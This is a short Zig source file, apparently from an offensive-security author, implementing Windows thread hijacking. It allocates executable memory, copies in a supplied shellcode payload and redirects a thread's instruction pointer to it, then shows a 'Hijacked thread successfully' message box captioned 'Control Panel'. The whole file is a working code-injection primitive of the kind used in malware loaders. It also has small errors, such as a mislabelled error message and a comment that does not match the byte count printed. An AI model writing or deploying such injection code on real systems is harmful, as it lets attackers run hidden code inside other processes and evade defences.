// the following code has been published under the MIT license
// author : @zux0x3a

const std = @import("std");
const windows = std.os.windows;
const WINAPI = windows.WINAPI;
const HANDLE = windows.HANDLE;
const DWORD = windows.DWORD;
const LPVOID = windows.LPVOID;
const BOOL = windows.BOOL;
const CONTEXT = windows.CONTEXT;
const PAGE_EXECUTE_READWRITE = windows.PAGE_EXECUTE_READWRITE;
const MEM_COMMIT = windows.MEM_COMMIT;
const MEM_RESERVE = windows.MEM_RESERVE;
const kernel32 = windows.kernel32;

pub const CONTEXT_i386: u32 = 0x00010000;
pub const CONTEXT_CONTROL = CONTEXT_i386 | 0x0001;
pub const CONTEXT_INTEGER = CONTEXT_i386 | 0x0002;
pub const CONTEXT_SEGMENTS = CONTEXT_i386 | 0x0004;
pub const CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x0008;
pub const CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x0010;
pub const CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS;

const user32 = struct {
    pub extern "user32" fn MessageBoxA(
        hWnd: ?windows.HWND,
        lpText: [*:0]const u8,
        lpCaption: [*:0]const u8,
        uType: windows.UINT,
    ) callconv(windows.WINAPI) c_int;
};

// section external API functions.
pub extern "kernel32" fn GetThreadContext(
    hThread: HANDLE,
    lpContext: *CONTEXT,
) callconv(windows.WINAPI) BOOL;

pub extern "kernel32" fn SetThreadContext(
    hThread: HANDLE,
    lpContext: *CONTEXT,
) callconv(windows.WINAPI) BOOL;

pub extern "kernel32" fn ResumeThread(
    hThread: HANDLE,
) callconv(windows.WINAPI) DWORD;

pub fn hijackThread(h_thread: HANDLE, payload: []const u8) !bool {
    var old_protection: DWORD = undefined;

    var thread_ctx: CONTEXT = undefined;
    thread_ctx.ContextFlags = CONTEXT_FULL;
    std.debug.print("T C init\n", .{});

    // Allocate memory for shellcode
    const address = try windows.VirtualAlloc(null, payload.len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    //  std.debug.print("SC allocated at {}\n", .{payload.len});  // enable this to see the allocated memory once needed for debugging
    if (address == @as(?*anyopaque, @ptrFromInt(0))) {
        std.debug.print("VAlloc failed with error: {}\n", .{windows.kernel32.GetLastError()});
        return false;
    }

    // Copy shellcode to allocated memory
    @memcpy(@as([*]u8, @ptrCast(address)), payload);
    // Verify the copy
    var copy_successful = true;
    for (payload, 0..) |byte, i| {
        if (byte != @as([*]u8, @ptrCast(address))[i]) {
            copy_successful = false;
            break;
        }
    }

    if (!copy_successful) {
        std.debug.print("Mem copy failed\n", .{});
        return error.MemoryCopyFailed;
    } else {
        std.debug.print("Mem copy successful\n", .{});
    }

    // Verify the copy
    std.debug.print("Copied SC (first 16 bytes): ", .{});
    for (0..@min(794, payload.len)) |i| {
        std.debug.print("{x:0>2} ", .{@as([*]u8, @ptrCast(address))[i]});
    }
    std.debug.print("\n", .{});

    // @memcpy(@ptrCast([*]u8, address), payload.ptr);

    // Change memory protection
    windows.VirtualProtect(address, payload.len, PAGE_EXECUTE_READWRITE, &old_protection) catch |err| {
        std.debug.print("VAlloc failed with error: {}\n", .{err});
        return false;
    };

    if (GetThreadContext(h_thread, &thread_ctx) == 0) {
        std.debug.print("GetThreadContext failed with error: {}\n", .{kernel32.GetLastError()});
        return false;
    }

    // Update instruction pointer
    thread_ctx.Rip = @intFromPtr(address);

    // Set new thread context
    if (SetThreadContext(h_thread, &thread_ctx) == 0) {
        std.debug.print("SetThreadContext failed with error: {}\n", .{kernel32.GetLastError()});
        return false;
    }
    //std.debug.print("Thread Hjcked successfully\n", .{});
    _ = user32.MessageBoxA(null, "Hijacked thread successfully.", "Control Panel", 0);

    return true;
}
